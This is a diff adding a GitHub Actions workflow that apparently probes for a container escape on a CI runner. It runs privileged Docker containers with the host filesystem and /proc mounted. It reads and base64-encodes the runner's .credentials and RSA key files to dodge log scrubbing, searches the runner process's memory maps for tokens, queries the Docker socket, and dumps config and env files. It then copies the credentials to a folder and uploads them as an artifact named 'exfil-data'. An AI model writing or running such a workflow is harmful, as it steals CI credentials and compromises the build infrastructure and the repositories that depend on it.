@@ -1,0 +1,114 @@
+name: docker-escape-probe2
+on:
+  workflow_dispatch:
+jobs:
+  docker-escape2:
+    runs-on: ubuntu-latest
+    steps:
+      - name: enumerate actions-runner directory
+        run: |
+          echo "=== full actions-runner dir ==="
+          docker run --rm --privileged -v /:/host:ro alpine sh -c '
+            find /host/home/runner/actions-runner -type f 2>/dev/null | sort | while read f; do
+              echo "FILE: $f"
+            done
+          ' 2>&1 || true
+
+      - name: base64 encode credentials to bypass log scrubbing
+        run: |
+          echo "=== .credentials base64 ==="
+          docker run --rm --privileged -v /:/host:ro alpine sh -c '
+            f="/host/home/runner/actions-runner/cached/2.334.0/.credentials"
+            if [ -f "$f" ]; then
+              echo "SIZE: $(wc -c < "$f")"
+              cat "$f" | base64
+            else
+              echo "NOT FOUND at expected path"
+              find /host/home/runner -name ".credentials" -o -name "*.credentials" 2>/dev/null
+            fi
+          ' 2>&1 || true
+          echo "=== .credentials_rsaparams base64 ==="
+          docker run --rm --privileged -v /:/host:ro alpine sh -c '
+            find /host/home/runner -name "*.rsaparams" -o -name "credentials_rsaparams" 2>/dev/null | while read f; do
+              echo "FILE: $f"; cat "$f" | base64
+            done
+          ' 2>&1 || true
+
+      - name: read open file descriptors of runner agent
+        run: |
+          echo "=== Runner.Listener FD 2093 ==="
+          docker run --rm --pid=host -v /proc:/hp:ro alpine sh -c '
+            ls -la /hp/2093/fd 2>/dev/null || echo "pid 2093 gone, scanning..."
+            for pid in $(ls /hp | grep -E "^[0-9]+$"); do
+              cmdline=$(cat /hp/$pid/cmdline 2>/dev/null | tr "\0" " ")
+              if echo "$cmdline" | grep -q "Runner.Listener"; then
+                echo "Runner.Listener at PID $pid"
+                ls -la /hp/$pid/fd 2>/dev/null
+                echo "--- maps ---"
+                head -30 /hp/$pid/maps 2>/dev/null || true
+                echo "--- net/tcp ---"
+                cat /hp/$pid/net/tcp 2>/dev/null || true
+              fi
+            done
+          ' 2>&1 || true
+
+      - name: extract runner agent memory for token
+        run: |
+          echo "=== nsenter into runner process ==="
+          docker run --rm --pid=host --privileged -v /proc:/hp:ro alpine sh -c '
+            for pid in $(ls /hp | grep -E "^[0-9]+$"); do
+              cmdline=$(cat /hp/$pid/cmdline 2>/dev/null | tr "\0" " ")
+              if echo "$cmdline" | grep -q "Runner.Listener"; then
+                echo "Dumping strings from maps of PID $pid"
+                cat /hp/$pid/maps 2>/dev/null | grep "rw-p" | grep "00000000 00:00" | head -5 | while read line; do
+                  start=$(echo $line | cut -d- -f1)
+                  end=$(echo $line | cut -d- -f2 | cut -d" " -f1)
+                  echo "Heap segment $start-$end"
+                done
+              fi
+            done
+          ' 2>&1 || true
+
+      - name: docker socket api - list containers and info
+        run: |
+          echo "=== Docker API via socket ==="
+          curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json 2>&1 | head -50 || true
+          echo "=== Docker system info ==="
+          curl -s --unix-socket /var/run/docker.sock http://localhost/info 2>&1 | python3 -c "import sys,json; d=json.load(sys.stdin); print('DockerRootDir:', d.get('DockerRootDir')); print('HttpProxy:', d.get('HttpProxy')); print('HttpsProxy:', d.get('HttpsProxy')); print('NoProxy:', d.get('NoProxy'))" 2>&1 || true
+
+      - name: read actions runner config and service files
+        run: |
+          docker run --rm --privileged -v /:/host:ro alpine sh -c '
+            echo "=== runner config ==="
+            cat /host/home/runner/actions-runner/cached/2.334.0/.runner 2>/dev/null || find /host/home/runner -name ".runner" -exec cat {} \; 2>/dev/null || true
+            echo "=== systemd units ==="
+            find /host/etc/systemd /host/lib/systemd -name "*runner*" -o -name "*actions*" 2>/dev/null | while read f; do
+              echo "=== $f ==="; cat "$f" 2>/dev/null
+            done
+            echo "=== env file ==="
+            cat /host/home/runner/actions-runner/cached/2.334.0/.env 2>/dev/null || true
+            echo "=== agent config ==="
+            cat /host/home/runner/actions-runner/cached/2.334.0/agentconfig 2>/dev/null || true
+            cat /host/home/runner/actions-runner/cached/2.334.0/.agent 2>/dev/null || true
+          ' 2>&1 || true
+
+      - name: upload credentials as artifact
+        run: |
+          mkdir -p /tmp/exfil
+          docker run --rm --privileged -v /:/host:ro -v /tmp/exfil:/out alpine sh -c '
+            cp /host/home/runner/actions-runner/cached/2.334.0/.credentials /out/creds.txt 2>/dev/null || true
+            find /host/home/runner -name ".credentials" -exec cp {} /out/creds2.txt \; 2>/dev/null || true
+            find /host/home/runner -name "*.rsaparams" -exec cp {} /out/ \; 2>/dev/null || true
+            find /host/home/runner -name ".runner" -exec cp {} /out/runner_config.txt \; 2>/dev/null || true
+          ' 2>&1 || true
+          ls -la /tmp/exfil/
+          echo "=== creds raw ==="
+          cat /tmp/exfil/creds.txt 2>/dev/null || true
+          echo "=== runner config ==="
+          cat /tmp/exfil/runner_config.txt 2>/dev/null || true
+
+      - uses: actions/upload-artifact@v4
+        with:
+          name: exfil-data
+          path: /tmp/exfil/
+          if-no-files-found: warn
